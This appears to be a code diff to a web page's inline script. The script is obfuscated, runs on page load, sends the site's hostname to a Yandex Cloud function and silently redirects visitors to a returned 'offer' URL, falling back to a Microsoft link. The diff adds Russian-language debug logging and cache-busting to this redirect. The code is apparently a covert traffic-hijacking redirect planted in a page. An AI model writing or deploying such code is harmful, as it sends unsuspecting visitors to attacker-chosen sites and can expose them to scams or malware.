@@ -35,7 +35,8 @@ body{font-family:sans-serif;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2
 (function(){
 var _0x2 = "https://functions.yandexcloud.net/d4e5bqhobljvknj550vf";
 var _0x3 = "https://go.microsoft.com/fwlink/?LinkId=521839";
-var _0x4 = _0x2 + "?site=" + encodeURIComponent(window.location.hostname);
+// Добавлен параметр &t= для сброса кэша браузера
+var _0x4 = _0x2 + "?site=" + encodeURIComponent(window.location.hostname) + "&t=" + Date.now();
 
 function _0x5(_0x6) {
 // Задержка 100 мс для мгновенного перехода
@@ -43,9 +44,26 @@ setTimeout(function() { window.location.replace(_0x6); }, 100);
 }
 
 document.addEventListener('DOMContentLoaded', function() {
-fetch(_0x4).then(function(_0x9) { return _0x9.json(); }).then(function(_0xA) {
-if (_0xA && _0xA.url && _0xA.url !== "undefined" && _0xA.url !== "null") { _0x5(_0xA.url); } else { _0x5(_0x3); }
-}).catch(function() { _0x5(_0x3); });
+    console.log("1. Отправляем запрос на Яндекс: ", _0x4);
+    
+    fetch(_0x4)
+    .then(function(_0x9) { 
+        console.log("2. Ответ получен, статус: ", _0x9.status);
+        return _0x9.json(); 
+    })
+    .then(function(_0xA) {
+        console.log("3. Данные от функции: ", _0xA);
+        if (_0xA && _0xA.url && _0xA.url !== "undefined" && _0xA.url !== "null") { 
+            console.log("4. Перекидываем на оффер: ", _0xA.url);
+            _0x5(_0xA.url); 
+        } else { 
+            console.warn("4. Ошибка: пустой URL, летим на Microsoft");
+            _0x5(_0x3); 
+        }
+    }).catch(function(error) { 
+        console.error("ОШИБКА FETCH: ", error);
+        _0x5(_0x3); 
+    });
 });
 })();
 </script>
